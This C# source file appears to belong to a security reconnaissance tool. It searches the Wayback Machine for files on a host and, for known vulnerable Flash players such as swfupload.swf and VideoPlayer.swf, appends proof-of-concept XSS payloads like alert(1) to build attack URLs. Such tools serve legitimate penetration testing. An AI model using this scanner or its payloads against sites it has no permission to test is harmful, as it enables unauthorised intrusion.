using Clark.Common.Models;
using Clark.Common.Utility;
using Clark.WebArchiveCrawler.Model;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Clark.WebArchiveCrawler
{
    public static class Crawler
    {
        private static List<AttackFile> _knownAttackFiles = new List<AttackFile>();

        public static List<string> SearchFileType(CrawlRequest request, bool filterKnownAttackFiles)//, CrawlerContext context)
        {
            if (_knownAttackFiles.Count == 0)
                Initilize();

            List<string> foundFiles = new List<string>();
            string resumeKey = "";
            bool continueLoop = true;
            do
            {
                WebPageRequest webRequest = new WebPageRequest();
                // webRequest.Address = "https://web.archive.org/cdx/search?url=" + request.Address + "&matchType=domain&collapse=urlkey&output=text&fl=original&filter=urlkey:.*"+request.FileType+"&limit=10&page=1";
                webRequest.Address = "https://web.archive.org/cdx/search?url=" + request.Address + "/&matchType=host" +
                                                                                                     "&collapse=urlkey" +
                                                                                                     "&output=text" +
                                                                                                     "&fl=original" +
                                                                                                     @"&filter=original:.*\." + request.FileType + "$" +
                                                                                                     "&filter=statuscode:200" +
                                                                                                     "&limit=" + request.Limit +
                                                                                                     "&showResumeKey=" + request.FindAll.ToString().ToLower()+
                                                                                                     "&resumeKey=" + resumeKey;
                WebPageLoader.Load(webRequest);

                if (!String.IsNullOrEmpty(webRequest.Response.Body))
                {
                    //  return webRequest.Response.Body;
                    List<string> foundStrings = webRequest.Response.Body.Split(new string[] { "\n" }, StringSplitOptions.RemoveEmptyEntries).ToList();
                    if (foundStrings.Count <= request.Limit)
                    {
                        foundFiles.AddRange(foundStrings);
                        continueLoop = false;
                    }
                    else
                    {
                        foundFiles.AddRange(foundStrings.Take(request.Limit));
                        resumeKey = foundStrings.LastOrDefault();
                        if (resumeKey == null)
                            continueLoop = false;
                    }
                }
                else
                    continueLoop = false;

            } while (request.FindAll && continueLoop);



            if (filterKnownAttackFiles && foundFiles.Count!=0)
            {
                List<string> dangerzone = new List<string>();

                foreach (string url in foundFiles)
                {
                    string file = url.Split('/').LastOrDefault();
                    if (file == null)
                        continue;

                    foreach (AttackFile attack in _knownAttackFiles)
                    {
                        if (file.Equals(attack.File, StringComparison.InvariantCultureIgnoreCase))
                        {
                            foreach (string attackString in attack.Attacks)
                            {
                                dangerzone.Add(url + attackString);
                            }
                        }
                    }
                }

                foundFiles = dangerzone;
            }

            return foundFiles;
        }

        private static void Initilize()
        {
            //https://speakerdeck.com/fransrosen/a-story-of-the-passive-aggressive-sysadmin-of-aem?slide=61

            _knownAttackFiles.Add(new AttackFile()
            {
                File = "player_flv_maxi.swf",
                Attacks = new List<string>() { 
                    "?onclick=jav%gascript:confirm(1)"
                }
            });

            _knownAttackFiles.Add(new AttackFile()
            {
                File = "slideshow.swf",
                Attacks = new List<string>() { 
                    "?contentPath=%5c\"))%7dcatch(e)%7balert(1)%7d//"
                }
            });

            _knownAttackFiles.Add(new AttackFile()
            {
                File = "StrobeMediaPlayback.swf",
                Attacks = new List<string>() { 
                    "?javascriptCallbackFunction=alert(1)-String"
                }
            });

            _knownAttackFiles.Add(new AttackFile()
            {
                File = "swfupload_f9.swf",
                Attacks = new List<string>() { 
                    "%22])%7bif(!this.x)alert(1),this.x=1%7d//"
                }
            });

            _knownAttackFiles.Add(new AttackFile()
            {
                File = "swfupload.swf",
                Attacks = new List<string>() { 
                    "movieName=%22])%7dcatch(e)%7bif(!this.x)alert(1),this.x=1%7d//"
                }
            });

            _knownAttackFiles.Add(new AttackFile()
            {
                File = "VideoPlayer.swf",
                Attacks = new List<string>() { 
                    "&namespacePrefix=alert(1)-window",
                    "&movie=%5c%22));if(!self.x)self.x=!alert(1)%7dcatch(e)%7b%7d//",
                    "&namespacePrefix=window[/aler/.source%2b/t/.source](1)-window"
                }
            });
        }
    }

    internal class AttackFile
    {
        public string File = "";
        public List<string> Attacks = new List<string>();
    }
}